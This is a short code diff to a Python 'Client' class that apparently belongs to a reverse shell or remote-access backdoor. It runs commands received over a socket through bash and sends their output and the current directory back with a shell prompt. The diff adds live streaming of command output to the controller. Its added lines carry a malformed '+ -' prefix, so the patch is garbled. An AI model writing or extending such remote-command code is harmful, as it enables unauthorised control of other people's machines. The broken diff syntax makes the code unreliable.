@@ -59,6 +59,11 @@ class Client:
                     try:
                         cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, executable='/bin/bash', stderr=subprocess.PIPE,
                                                stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+                        while cmd.poll() is None:		
+ -                            l = cmd.stdout.readline()		
+ -                            q = cmd.stderr.readline()		
+ -                            result2 = str(l+q, "utf-8")		
+ -                            self.s.send(str.encode(result2))
                         result = str(cmd.stdout.read() + cmd.stderr.read(), "utf-8")
 
                         self.s.send(str.encode(result + str(os.getcwd()) + " > "))
